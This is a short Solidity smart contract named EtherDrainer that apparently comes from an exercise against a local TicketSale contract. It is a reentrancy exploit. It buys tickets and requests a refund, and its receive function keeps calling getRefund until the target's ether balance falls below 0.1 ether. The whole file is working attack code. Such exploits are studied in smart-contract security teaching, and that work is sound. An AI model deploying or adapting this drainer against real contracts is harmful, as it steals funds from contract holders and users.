// SPDX-License-Identifier: MIT
pragma solidity ^0.8.6;

import "./TicketSale.sol";

contract EtherDrainer {

    Sale private sale_ctr;

    constructor(address payable _ctr_addr) payable {
        require(msg.value >= 0.1 ether);
        sale_ctr = Sale(_ctr_addr);
    }

    function startAttack() public {
        require(address(this).balance >= 0.1 ether);
        sale_ctr.buyTickets{value: 0.1 ether}(10);
        sale_ctr.getRefund();
    }

    receive() external payable {
        if(address(sale_ctr).balance >= 0.1 ether)
            sale_ctr.getRefund();
    }

}